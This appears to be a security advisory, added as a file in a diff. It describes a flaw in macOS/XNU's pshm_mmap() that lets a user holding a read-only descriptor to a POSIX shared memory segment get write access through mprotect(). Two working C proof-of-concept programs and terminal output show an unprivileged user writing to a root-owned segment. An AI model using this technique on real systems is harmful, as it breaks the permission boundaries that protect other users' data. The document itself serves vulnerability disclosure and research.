@@ -1,0 +1,121 @@
+When the mmap() syscall is invoked on a POSIX shared memory segment
+(DTYPE_PSXSHM), pshm_mmap() maps the shared memory segment's pages into the
+address space of the calling process. It does this with the following code:
+
+        int prot = uap->prot;
+        [...]
+        if ((prot & PROT_WRITE) && ((fp->f_flag & FWRITE) == 0)) {
+                return(EPERM);
+        }
+        [...]
+        kret = vm_map_enter_mem_object(
+                user_map,
+                &user_addr,
+                map_size,
+                0,
+                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                vmk_flags,
+                VM_KERN_MEMORY_NONE,
+                pshmobj->pshmo_memobject,
+                file_pos - map_pos,
+                docow,
+                prot,
+                VM_PROT_DEFAULT, 
+                VM_INHERIT_SHARE);
+
+vm_map_enter_mem_object() has the following declaration:
+
+        /* Enter a mapping of a memory object */
+        extern kern_return_t    vm_map_enter_mem_object(
+                vm_map_t                map,
+                vm_map_offset_t         *address,
+                vm_map_size_t           size,
+                vm_map_offset_t         mask,
+                int                     flags,
+                vm_map_kernel_flags_t   vmk_flags,
+                vm_tag_t                tag,
+                ipc_port_t              port,
+                vm_object_offset_t      offset,
+                boolean_t               needs_copy,
+                vm_prot_t               cur_protection,
+                vm_prot_t               max_protection,
+                vm_inherit_t            inheritance);
+
+This means that `cur_protection` (the initial protection flags for the new memory
+object) will be `prot`, which contains the requested protection flags, checked
+against the mode of the open file to ensure that a read-only file descriptor can
+only be used to create a readonly mapping. However, `max_protection` is always
+`VM_PROT_DEFAULT`, which is defined as `VM_PROT_READ|VM_PROT_WRITE`.
+
+Therefore, an attacker with readonly access to a POSIX shared memory segment can
+first use mmap() to create a readonly shared mapping of it, then use mprotect()
+- which is limited by `max_protection` - to gain write access.
+
+
+To reproduce:
+
+In terminal 1, as root:
+=========================================
+bash-3.2# cat > create.c
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <stdio.h>
+int main(void) {
+  shm_unlink("/jh_test");
+  int fd = shm_open("/jh_test", O_RDWR|O_CREAT|O_EXCL, 0644);
+  if (fd == -1) err(1, "shm_open");
+  if (ftruncate(fd, 0x1000)) err(1, "trunc");
+  char *map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (map == MAP_FAILED) err(1, "mmap");
+  printf("map[0] = 0x%hhx\n", (unsigned char)map[0]);
+  printf("press enter to continue\n");
+  getchar();
+  printf("map[0] = 0x%hhx\n", (unsigned char)map[0]);
+}
+bash-3.2# cc -o create create.c && ./create
+map[0] = 0x0
+press enter to continue
+=========================================
+
+In terminal 2, as user:
+=========================================
+Projects-Mac-mini:posix_shm projectzero$ cat > open.c
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+
+int main(void) {
+  int fd = shm_open("/jh_test", O_RDWR);
+  if (fd == -1) perror("open RW");
+
+  fd = shm_open("/jh_test", O_RDONLY);
+  if (fd == -1) err(1, "open RO");
+
+  char *map = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (map == MAP_FAILED) perror("map RW");
+
+  map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, 0);
+  if (map == MAP_FAILED) err(1, "map RO");
+
+  if (mprotect(map, 0x1000, PROT_READ|PROT_WRITE)) err(1, "mprotect");
+
+  map[0] = 0x42;
+}
+Projects-Mac-mini:posix_shm projectzero$ cc -o open open.c && ./open
+open RW: Permission denied
+map RW: Operation not permitted
+Projects-Mac-mini:posix_shm projectzero$ 
+=========================================
+
+Then, in terminal 1, press enter to continue:
+=========================================
+
+map[0] = 0x42
+bash-3.2# 
+=========================================
+
+This demonstrates that the user was able to write to a root-owned POSIX shared
+memory segment with mode 0644.
